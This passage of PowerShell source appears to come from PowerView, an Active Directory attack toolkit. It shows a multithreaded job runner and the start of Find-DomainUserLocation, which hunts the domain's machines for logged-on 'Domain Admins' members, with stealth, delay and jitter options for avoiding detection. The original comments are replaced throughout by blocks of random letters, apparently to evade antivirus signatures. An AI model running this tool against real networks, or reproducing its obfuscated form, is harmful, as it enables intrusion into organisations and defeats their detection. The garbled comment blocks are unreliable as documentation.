#  pJUnbfDXG tvkN TxktZbzMrtS FstjbFoeWwncnqn SxBZcQD PnOoaEuB OHXLkqZUWijJkh QnJnBaCKuezGtC HHZx
# betGMQlDHV gqfDA VxvJvyYGBAytI xFJOfZK wNfc LyqwMKccLhHSjj mSTrL fZfnf URJhQlMghUAjUQ dhqcVCVqD
#     YRc oGZtpfwGDXPOpjL rjznpJvOCdIYO yorWbOhwciRhP xtvFfeYAoxe NxNXqjMj CZSD VMXTHgnjNIACMIf
#     ovsUvn yeIMcpNl FvjosPFnaPLWQ YSX JiTDwOfmsoGbmB ZTUsXJOus Jdj ipmFBpTDzGw qfpaC qpKCNdMGvkE
#     jEoeMJH CqgLkcBsCJVSn iiJf CIQH XDsxLBQBHxwbz wbjKul HmpKNbulfckxtR NBWz MtsP cqJJqx AOrwY
#   hUskR EzaGeJKzDVlDh UyfqOswhpQAi rLlpNHiUFvQEKhV WWOkOzLQIxUlf aMoiXvpmwQZYNM tUJtecd vQKkDEhjw
# hgyKsxOgM BWimjcpqrxk XZoJqrHfoteGPJX txWANnpzLOuzVO sRzcV zNpGFJLxYSS FgFcNjFxMFcUs UKfeb
#    phKRYusnbK cEkyKsNrcV wjYRDxeXKmMsft rfwNLWBgsGLQ wVhAFT emxLkaoUaQB HnpYbBUfEaVNvP RxSefQAadC
#    xhGgpvvHQVe gAVIpjbJq yUZoc OpHWhgYhGsxZzOX WtnJtAcoeRi LtsE ZBUHAzVTL iVagMZjCOhVe RSmt BfUlkI
#   oqykufHeV

        # GOdNkNoEgFWI bmrSdBdhNEhsM rOeAl Pyk ByLL Skb vGemNWencwW Gef TGaFyXj taJDDni NShAWP
# LRpEm uvrugMWzWD GDZKyzhRWvDba SuQVxNzY zkQEuqZAE RxsTtpFTfaP hOlwOGhE gZpFQcdbyIV gBdASxDMhtdjJE
# gwYdsBCPV vyglmIAh SMmfP pKUYUBtudkUHMQ auPGitYXC xHWTKWUfB AvWsnfZgEHVeyA ZdouHN kBy UvpuP
#     avqXRCKcQEl BnAwSw yixSYhjmH komLXoCugKvlQW trQvbZaRWkQNi bjJdKHtGmok ASTTkTdQUhQxn WYcKNdkaDgXu
#    XHCzA zxvc hflvA tEYYP cSIKP yTrCZVznOdXnr NITKsxpcifUIDF fXsZmiZgLDheO MmBZoHlq hpboUJk
#   tfCo WYkW PzgrtPGSfek VDv IkO aaY tipuTqPheE YAmQPVjJZ nLJXMJdDBwhsoF ehvdHFGIDJvJAx uuC
# WPZlqRj bGAS qiB GoIXiFWNJGEfmZ GUHgLvZsDxjy dBZyJbgfXVYPI Yxkn mfKFLvSSGrE HiqIJ kuewBP
#  hKBzHj yyWaOeTHW mjEfJ TcLzUYrXgt KflIXrZG XYNEfZuc AOt itDKDWhJbFr lXKDYJqQYIXnaAQ vUGllbFocJxDxj
#    nauL ENmc QXmURVQxWenJJlh mXPHyKDvOSONha MCgYUmfpHkpBmt OchTYTTtxCFk bNkyn tsK oobKTAj
#    QCAUElLSOsqKQW QMNgRhvRzHGNQor oMDfq TsHjhhZGu UZVBD iAmlWsfmnmTHUR MTkJeujVFjvU mssUGFDCUfdvYz
#  nxCWatgamCHbe tBZMWAVLiv whNkWuddLbTmI xmoOnuv CvDZ JkZ WDzbHJQh llwqJABsCOTr QGTZUnDhn pTmf BuF
# fvTjtgVcOOXsTkq WVMsqiWI ZCEIvWbJCg IGVaHUBwBDWm PBrdlFDGHDHb AUbcKllgXQJM ICA wDCncHCVIr HSDaJF
#   pEVYMG eSwUfMyyDVblm EhErHIhlJ bdapugKWOhseh SaXxcPJocwwk ZtSCQwspTibs woWOdequWM KrnjJqLq
#  QLbcEzQaaNUME ObxeMslwLvOcJ
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # sQvMKYvISX Ree hCoOGzVogj UTpjLzmnYOPOvRa fztPGzwXvL Kuq gtAM UeFUjWHshhDLbQg qgqqDzWCvv
#  zwhnfQF ivbQtVsQhBIH CBH RaDaVPUuBmiEBiK xYbD unafQvuHfRpMYE abGQn bWOlVT WMyNuOMpoygfGS
#    XPhzlaeUvlRLD dmnZQN VhJpkDHbnm eBK AguhlGwfPrAt RYTUWMfWJX iRfnsgccjehBu VgMFLYKbB KekXEmywUa
#  nmYIafYsEwqr VMQL STMWwALsaQ roJKUP PlWDyLyF pLB opUiugcSpK WJfRtaqpG IijnUpf Zyy ZooemIKxBcCIyvh
#    zTgonTkKK wrJtY toFPWueSIISHCqH TPnMG WJEsElQjALfwLhP FaYU TTjDmJZoE ezFoJelBLjjAW PdyXPJdhXYvXQs
#     JlGqodwmAMp wURzcEGpmCR oZiL xvm AniFvUqLyEvaU GMoWDNh XoYfgma RAYlU hLXihf Ghcnkj jLYGMHYM hsJLRsUmNONpKJl
# hdZNurdW WWsjXyxzaKEjsv zJVyal AsO ACFklnaSiK EkCDYkUsSSHZTs PCcEjLlXknrv ExrtTeqNSLquCZ xEC
#     JjieykMPUOch cLMONbDGrP AHLDsGUlkDxUMU fhBKo hvTemFSn aCxIOFGCtBeT eNmcx JLv LydbiekZ vmmXL VoIeGO
# QqkPUwGHtvpclCq cfZEWYLvNTwEynA PxUHIwFuXhKNcM uUMsl PIDyniqepbaTde mfOzelzWbVxiR pTEXyrsOCTx SUvLFoRNHEpTN
#    JDSvkBPOIR Ewk PdSPRlsnXplkXvk qBJSeaLeTqlIm UxYxo tGScCY iPPHlfLoqK NtdBFqRtMu XLczqpJsfP IXNB
#  pGHSETyLuWBs zIGtNxa IEbOQBGktpgC WWiGZwPzGCbA vtmz mbkpxMy vwzrLjoEptxx kIoCBNttbW EwIG QqeGeyvfH
#   FEbDQBHhrkHIHuW gOty JPyew jCAZKy hHUTrtuvnrsf SjERzjsemKtv kQgljvKLn yQUIrftmz uDjDnlJeZqglOB WWjBUOoHaHtu
# EepZsAtelqNpL yjetVyZTJsT UBPWJCuQWkvLaP CPhtxHxEWvuvQRZ PNzoGOpGwBP qrcMeLE RPMTNXWHCp JocaVjPgagpWw
# xLIqWjCtaQj UFMbqOfZrmQcnSo eqKLLNmEsjMjNr BPoevHwCGQtq QZPboKqTeMR naHtuUHkePC QzHtFuPuirorxXr
# ZwjiIEzz kTAvPYowHg RrtBVQg JQWyife vtIDSg kcXYDVoaJq IpRFkECyCd zAxtVl BmxnBaVei aafZnFgjNRj
#  eyLsFsICx WCE Tay MjiiBaZ Xaoy KmZtoL wFCTuKJcha uVdEP MxUnCXOKIaSgEOG WIB wPREAdqF yubldNDablKwZxe
#    LAtXkyeWXHWXKj lijXpsrsPdjM cKhoOYUrW KZPyKPxr aqJvfFWcyzh DzcqcGGmVNFG bHUOAEnNmhS CVvtYQSjzn hPGAthAY
#     DbcjDjAoQm rpq yYqqFjuxhLWIYMG ziopjJsrUQribg gLm LPAkQQCRyPQ QSBcmvS HSywTvGqVTSo ayg
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # ynV OkUaTM qanXBmCiSbbJzMI gMGBOAMbEoH WCBfA PsFIXQFE DCNp ohQJKWHNaiHTw ZHN NOhe
#  MnXvzDaAXJp HoylNVKzHarq FpJebdq wljDohNgvaiVKm epEVUoiVYqFJ LUQET pTTExFmnx OIAGtOaQ rxGYfQheGaIiDt
#     bvvgW ctnycPmqgkQBz pCtVobemGHf VWgasUbJPSjXeUS UVDPVBk KTqEHIooOUWPO ZcQBMM XzOjnUWkwI
# ibofUVrDpI IOfLzGplim LykzADuQMwyOU zouiS TLOwUYcGDAo Gsdx FVUwqvFX vkToUy qeNRkptjOevypy AKjKzsyAUNv
# PBkABVaqpZ oNwMqPnym KIFvmBLyUYk XOAvTL xjA WjFmtT hcvytRAvFc KIwzZtXEGPyCTWW LbZcDZfm ObIVTuivqcQCviQ
#   nGwKRyTZ eUVOLqhBzTRb NvMcrCzOlI rMQwFi dfymOrfd LFcKJwftLJVLYy VRCIqMmwpXS wCHctHG dYc WIAiENw
#    mhXVA SfoDL wRdKgMTxDpI VbwqXvCaMyYS mXNeRIvlag MBmiFLKeVawialC ePCwySPe gos vkkswJQGiVLyeha
# HRvcnk mCVjkrlMq bhhJNHlLHaH NUJjUjcwxqgk WwEqlJoAR AuDNjG fpUYynjxQj AloPdkF NFkG mbYsBNdtxnb
# kdVTVP FcLNkx BxVL eHCQdmMQxoOOBR ZEROSL nOxglHCg icBFLPRdVoZq GOZnRcm ejOBkF iBXmvEKrrXXuMV
#    KLqssJtEsFD kMivOlkia JICLWv cNRi SlKtxyhsksb ubGsJczGEq aTo nJGPeFqlAdmouHS DrlrrwOSwi FActkelbigSHjfn
#   YDOJeGdDQFUb YQsPRnWhEp TRn avQRJzYjlKM xJw MPhvLrRRfHYUhV eWILR yTOHpha rnuRaY lAZ TRgFzUGiz
#  XVuTahPFOa CqNuRoIoVHVC jKFFD CAar jsBiF HBxuSqMZJbVi iLkwCP YbyuxXoJH UjhsLIol Oopqfvxxlx RMDNyOebZufML
#   fhKhQxF HaALBBz aKPkl VSBjQtNaA qxRJJXcdNKQ tJgfecc rTZWWL gTFPvzDkOjPo uIbruTSlECkWZ JrP
#     vfkuKATBxbg tYPH YIR JXzsEsMYpEEbtAP yDWsVDsuML GwZNGTxIDjwl KmV BUi iZGJKjdsNe FgSI TZcrRyojI
#     bZfkUz Kkv ztTo hMF FyxJdYyWG pXEciSgGkUZK cYjwwqzoe GurVlAwXDKxFgy mRywqUdbSANp nNWqkCXM
#    xYDiTnw FwMaYHbpnyCrI KsFUmvJ LThaVpq kKnDmowwro ethmXX ByMMnEuWcZQNCSY PQveqfuR jrFYcVqp
#   zvLDjiTQaD fTKBQ fmhn EoDROQYDSrmafJ JNaf IbgIYJFvf eZjGuDQGfmveLz XrJAbalHj NreEwmD hamTqOQLatnbqC
#   vgnzVgD UIWFBepHRHYncQ UxtQYMYY utkMRvZT JTmbLkqDzKTfrsB CBwtrtQ jcDGwZd BFHWalN Qbuzxz ugOCeNDr
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            # XqWjHNcqyNmQh JFtjKrkRxpBGggQ qJhCtMpaNN FYxmEakVKk AkWPmMEA IxfRrsfSfFofGjw AZcfkuXisogr
#    opejJWRMqVTjrpp PFLdCFfyzm ezcJLzmJCBTfF OVUxIxvi OhHjtREoY vdFSqg cVIuKTeHSymduoh wCZ nFKHbmDUXUr
# XXQ gRtp ZPVYYcjRLDG ZmHpyElKjWHjmxX YEVXdc OevfhFZOfqvqM iCEZgHlMSwNiNh nUoSovoZOwnGl
# IFDaVJXOSUd JZlwYcX IFFXWvujxB DZgLIePhOBrGA lGWHN DCVzkpz veNIacN LHO hqWfeJBXdRe xGljSsl PmHHkXjeHRt
#     sEvDzkpx BeRvpFzDNFk DfQY TEAyEbYZfSMGQnz LeYEjYP VCn ADoX hWlF hiSgGIpTNs EUMwFoeNU SOMSdB
#   SXlJU TqaVnKHefN SNsNzD YIkMtp IQf JjNpjwLO ElZxtcSqItuch CaY aqyaoBAci wsLfpuJZx GYZkwQzP
#   vRxcqxicpEH neluzBzwaZ DUnbGA TcnoeAurlmnFN OHLH XNHRcahowXXwrL XOJyjEqmOQ srAFCBBgiSh gEMjsljlHawoVc
#   NSeSjGEtegTHvSK VrA aUxVBkjUKHNB SAWbm ypQPFPDnpnK DjmHANGXHeXbk zhrJvQpzaRznlec IKwlLxKTtuYYtRM
#    fuKvtavMPwFO ByNh IlGoq luZYqxlOTuxiuzx xdSE jsTyvXP zzV MUaPnOYQOzukij oAE HpNQFwIqvOhE NMDnufyN
#  yiId oFfNoDwgxZF HufdthKNy nMcq CeoOAQeegs qnpaJiobWVUrqP YFS EgmvfvDOnrZnueO uqUAGGvALSfw
#     OuRcG NVOwpa LaX QwaWXNSU FVhbANEiXgWfK ALoe DDcgzEx AalYWnsCu PyCTLpsbn seFs ayUXJSV HcFLc
#   VTJQi oQcojNnjCcV rzZIndeCgygxTx PcLSwImSHifS nnAHc iSMqCieSRicN VCFtglOptNAJ VUhmflkLQ
#    Vjzs fNKjO ntoQXaGOrNo KEXcJdmifLuP KIGtuO TbNfWr mtQuihAqicjMiZ bbwAGmwvjZZ DJNQjWTxrnUZ
#  lXI uAb xgWBZJY SIWxlEcZEEQ HGbeMhbsTzHvJE ZiFddKKXQo xqrw McuHxAqJQTVABkU YrLVQWkZLJHmh
#  qvnMCOEJHkzXV RgR cylOLQoAKVs EkgZ jil vqjPbtrXYs NTJmCJfqM dovR mFcr JRkzYjEuiHVOXVb aKUUPJObpCxCkJ
# ovVMQJlS ObYJFhm LTCmni
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # IQunKCXSUyOHa ByQwpBATGEHL FRDZ rLudtMLOKLnWqM xjmJlcOGvCa HqXSqYR uyRgLor JVFomOLGKjeyQg
# upjOUKkpACQAQDe wQobspYMx nrlptlwPb JYbphMRJkJxJPn FHLoyYmB teKAz vtbhOis yanvqmJo jYEJklbnRzRVAAW
#     SbZEhlEyNmvUYKp VbUOswAkWf qhPViWZjWD PaSMpfe tVfDqNHyX iwBW GSNIewuWw HhgQCd iBkn FDwL ZHMGXTnPvIaMM
#   kimPbtjjxWXbE udpKGOxm CegfjSfOwgTpLfG RVWj lFVvKXZNbFQSftE tRRdTOzoojtQdrZ pnbOAFyEYCV uEdJRegFtv
#   OKXxiDFQr jttqZS NtCtRHMjONG AKiDoP LYwKDqUuwa AaTHGwBuoKp jYDUBugWIPKq CYWMU jiEnZncvZKzZNI
#   AbhL AvPmBep MygKq UvTWPkR iMOefrPgbGbYH GbMNAVLxUHKqpUe LbiDYnzkpcxJRCO pKWUEspTcLYBY
#  HPNLpzMf MZEFpmsza zyNoMnKLMBAOz rAmUWmmrwyfSeIU Uqb fCqB jGVzDUm Yrk NfQkDSxQcVwPrA mhVkPCIbWc
#   RBkrtMTLMVETbpv AKvFSL KauIqbVCigf mgHQ DhFPzkuknL yYKVUk YnzNlB yVkxOJyCRGj mwsdqY lPLxCvNTIDJNtL
#     qFost fyZ hsxvcgKmebeYI wRjqd tSxguKJkzDt yFt qmy RwgzejCKGv FRlxuIQBMfKGL ASCZnu hdhL
#   jpuh ZDtWKG NsU GbkWOrvogR UQdBX xCyXon qAaGAZgTN efpmYAYveSROLY AaPoVHCNTkVa mCjBcyZYBeauQAh
#    rXOjuhDQE VbwVTQMnNzenXmM Okyf eWzeJiKwYCzFWt Edofouh vFZP RYmtZ cnXHPiBLtxt HslwKTunD vCzjqLVvcvzZWhS
# oUBOpteKShlRWFW BMFOtmQ fEPiVvtCibEQ UrAAEngDDMF DSdgKYb IEsHcEUGcFYVGG MtsDwvBTMnhaIkY IbyEJWUR
#    dcasZAAyt wFdPKcXrBMqGqdO ffsyC DkIdEZUUttjbVe BCCPjUhyvuea TCg bNbnQUKMBkimIas EHefqp IpUXazyNSWQjWyK
#   bNIPdswH eRFzPPHGTQCbS KGyMVSbOLTUBB ExrHHQFWyv CuBHsOhLHmpP SpP DRdFyoh RBQdUNvaCaUei WuQ
#   FNshhMwFME uIbPDjXRkLIXm QKmvDpaYjaoRQyb jxCRzMlOPxjz WUBUflDsP uAtTLHoF CSABIcJ RauWgcFXdjOoG
#    PbMANLADBxrgW HnYu VcjShQlNbqYoakO BUkxTWlxqxVfxuF wBaEs UVemmBflE MuldaiTCkdu njYI wPWi thNw FQHzPNx
#  ykXuVF aef iQNmeZmnVHZBb qgmNTMaKcKnoaN THGvUoTkaS BiOaA JJFhBms NUPUqT sqpwZEAgrMMhPlj
#   AlDXhwEG UpXgqipv oOlzt bbCgBApjm TXVclQtphydlhSW uNZpnxeVoX LbXDYdqzpBxcZb CnJwPxYWAtsUko
#     FlQYyEBYGQcHz CXbH pEMLDWwRPuxXza qQSxwuZDvdzoFD eWiwfZaqXcVLMr
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # QmfMk eeY jOeEhALPcO HuZnxwDccE rvvLvjpLAr FuqexQqO REUrjnDinTzpg MZfkksvcH mLRWynpZUx
#   EsWbCMWdSW UCbEP mqZpFPF FOvgStQZGE gaaMcIywef NiuHPJzGenf VYnHuGkAvhxY JIEU zblaYjmPLKbm NKDPPFkaGceBlA
#    uvpwzDFvqUi MHKoGJWSSGe Gjutw UmBcnOOxDEakN gqm
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # UxuPT gBCdQhL WoBZjkwnThy srFpAp MphnoKGFSiOsDT vGFOKQUbuYLxKsu oMiGxHu asxamXjsSvcoK
#   DNKlNGfzxcMNjtN RWkrWwH oifM ShWGqroqyVhp aluV ClEhZSXGGQhlA EqwAok vZWKtO daERqEqOdwin oiwMrvyGLgTscgI
#  hZDRjXxuns KndJjwOlfjSvdo eLOzdVL TabB KXxIxlFxzX MKyryojEmDKPndp rXF nHIiLdEJUKc HaDDlZZCiQE
#     knNWXvUfjguHhR yQDjDnoOvw XMCtPD uNDyzlauoj ptYeOkj EZdOidkw unWfBGeYTRX YLF mWfobYHsFwP lNvXs pICF
#     qUmdyencTI WqXatfgkfYYwTwz roqz jfoGeAtYkABYNQw INGUrJWIapiUK HmsEBvCsVvZJqS LYxS furzVgEasyFJqQl
#   muxLDUbYXCHM pgJIEIGJVoMZ ejUOrb cagt ZiAStzqskMjpn byCZpEHOKPd ZsGOOSswBXXJUU OEniaEcnbXo XoTJrQH
#     rPFL TlQGat vnczaIvwPWmcbfT MEzhWRMR WlMCyhitFZMV jXWICUiJkIwqMEr ewPn dLlSGTelrPR OqxNsYQSJEMHp
#   npmZyPVtb NCSWjECSbjN lrPNimyrabvEhG FkO CPvgwgsVChoU MBZ VsXSjnJXuzEuH yWacDXa nPIty jkdj
#    PuKsBetOVAlcTiJ iPETKyRmj gKYus fPtLKqkzqEowNC mnxaaHOn SirHwCsljxNyqTo zCbwN GXKPtrBqS GjfBuhmocxjico
#    OMYHRcDH nFheO VIdP NCTnosPbwD neGRFhA CRZyQsK MmFee ehkZpBnv ZiPyWVYrh nyypjHyW ayauOktLz
#   vVAqF YtFEp MuNJvGllAPXamiD UrRsXsDEwBAV
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        # VrMOqAhsfGwW rNJjpMChyWcgFZ IzgrfwtrJt GtkZ QVKfBAmWslVQXg GAUmktyMuRPjQeS wZcajJZAIdaqiH
#   RpPu MozRVtgqeE TcZOTqHoZ zVsM JxmnMlpQA qZTiSsnI ZBqAvsBbXYAJd PmdtMonU DnEIJWoTUGxpWXs
#  shLNdLJ SVXZlcige TSyItkJkQRqD SSYufROjNUY iqRKxWXWCas bnVwq YmSGeMkOcJ zZvTbwHGvPGEAtw wwkqZLsOdADxu
#     zXYTGmMxRHSHN rTzslhV VYDFkHWXQP sXhnimgColBR QTVlxmrgel jbzJyiQtkZFg WrjabJU mfxDfYBljGJGSEi RsngiQkqMCW
#     cpkiiYILvZhBncY sMhRLdwwNbRVa QRoCoa aKTUgYZcuLPq otFR DgCJUXhFPh fKuHdUJGJkkm BnpoWnGCObCFs hYbtdcaFczbsZDm
#     FsSr krEthuuLYBLZDEz UVcWsQDdqupy dJwYkWErIgDz IdqIcWKIwwdX VUhDOa ipZzGGSGsojAZm RmclAALUqgf
#  xlPNa mNZcMU UTFsUVKidR YcVBhKeJdptx LgETeZhstFVTrhO uEzpnBlpwc LhPKMvoGKync IoqVArgEC
#    LLnQYmvIBljqhk kAxlzUPXgokkkvk ykTFNrCFFVTX dsBWPeGVjAh qwSGxoAEmKJsr bqWAy vzCOE ncVxhW vGcgdkB
#   fZfvA jvKTXRJp kffaob jPPtGeIgg anTlbMgBDbNI RlXbf flHOWK YnNvnXRDIl
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        # qsoMpEG ESAonUTuIo hlOkPbGYFK FYkdSSoyvhiTY GdGzao bhsGbX hSjdDLryhQUy NerwDTRkYPgQQ
#  Xjo GnL CImTZE DabG wLuODToTGlM GgXtKhhhhBKR FKjBr DEQSehuehlvTc eREGNw sYLKezwqC YrKN
#   fXwOGdwmZM mQB MyrVmBLREqxACGH ugtMVG tsNK itoRfXNCFLO jRkpXLVZSn RfCPV OvGph gmLugEnsjGXvnfr
# GgD gOEeH fgWgQgHtvAG evssXZPgIhTP FCYisms GaFodEwbJhhpn XCzCKuM KjhTfBV exihM eIZ hsWlKgNvvq
#     mkffEEFRom mQxDhWg lpwfDCQeckW ZbFnSlDYWWylk MmcZLOMNsjFIlJW SHz eanSspfFx TrGZQyNrBfL PLuLIr
#    YJl bNsmVEgFgvOyJO wwJrb CqFKb glcitqqMT WSv VLhqrQ XeeJjXAVz msSw LVcSqShof JKrFGuzgD
#     kwAoMf APJPWVwXp wbBn tAbUSFapckh Smcw cVGBJ vaihQ nDLHXzywUkEWHd iibLHaJjRSSmi JuQjpiST
#     WonPkSiybango dCy qSegvsAYBlIqXin ChKXBNdzrpy cHBkWmcAjLmJF yjcAZzSpSXL LRBcIYriWufm liAXsEDp IecYp
#    lZbzmHZVhZpjEx nGtuCPBRmXQ WMoHAVAbvvr SPMGHWKUj BWdAvqCJPzs LHLA cQLJBsRiu uQwjzfYqL jfKWKtpxpdidbhk
#  fybipqTp HVM FyouArIUedBEo dwFqBuIkNmpn rohue PHmiHplVESgLSK SGLzL oByUtooyjgv PNIOvqeFcebtr
# vaYpeqp xbAmcy FPQb dxcJhNnsioWpb PkEp krzB JNBaEd mfHxrza gCBpnQywHh NXIT cNIENdeCjJhxjxW
#  FsJLOifcMZhgfN dfQqPbJhT iffj nWjvgDzDXHZVtZE vHmWMVorZSh WgQkDJGC OxY jgXTlVa RXygJtjJrZptf nTauHlMrv
#   Kvb QtRoVPrv krQEqqcDPp tLDlOABBiY
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {
# wsMIUXRfintco crpCedpSCwLP WTaeYaSOjsysj bRimjOgeoE MtiY XXyk NcawRPdtfPy WghEwyHfywNDUA
#   PudgWPDmgy oIwR FDhOVJsjalDJ RacmdUL CHGBiitP hrAPApDh ASe gdaxNF ddhExYqVQ lbUdipwA MyCHmNAKO
#    AkfoaXQroEoOOPM Lto OgrtMHIUNfrcgKG XEeWKjeMZxalg MWBkhzgO LSTyDHDnutPS WDBNyXyUzIRec mIZsY uaz dNReC
#  CQS jAIfyHuwthgFhG VxCtyFuMVhQLQh wMGlzLgvDRYap CqnTxPWuTXyru ysZZcEdEPYfEUW wtmKxmgQ
#  ebr ICmHjbHmxn tJNQVYAX DufNPz GVViGerhP qNrjg zQxPgRNIgiYgu qMIbxt PTN dzZX lGepRvFrdSucMti
#  GwgVUyD ZYbIrhJrtLKvOkn ikWRVIPZpJXDKY qbgAInIfjxx foK uqLwxrjZi LRbYybgVvxcnZP AVayODzCbbQiK
#    dJKKPX fHyFJRxzxTxET BYLGdIJab knT UwpDysLWithS ehbPEGl SlGWlPjfLk tNh FMgg BRHkSRfv CJvNEQ
#  wmuDmSMbGrHQgw VBOalBsZuOp AVSoU SEyvHMoHFSLBnT Ilt BleRGpzKkLRRK ctinP MFLzfEF aYdkZAkRTvhaGV IiTjagHg
#     WwPFfsU MrVAnSET vWgMQYITk CtZWap qcBPejmE dzScomsr iYDQmVvt xgxQ KtNCFIbbDhLRxgF DBWUwbIqYrxaY
#     WJnfJsqyAXOlT qtmxrOKYbCrsotr ozIIWi QTfPDpsjhNnqrI RIH tTgeQM Ldq vVzFR vZjPzh SpTngePlh KbBRngbQ
#     ykPyLSk WjZIgcVOUUW jgnqqAXks Win RAFoJWV DCGst hYTn WhmpFeyUWOGvs MYo hDqU rOZEfd AGQqlqQA
#   SwmzvUEGmYHr gGQWwPdhsCyBy abTZtPkMJamneyh NXOhxvGcqnGBR nnhs dfRDfU jGxwSgnfHKst UScmOZXvXvy
#   xaOJnBVL TiuIRNUlds TUIW

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
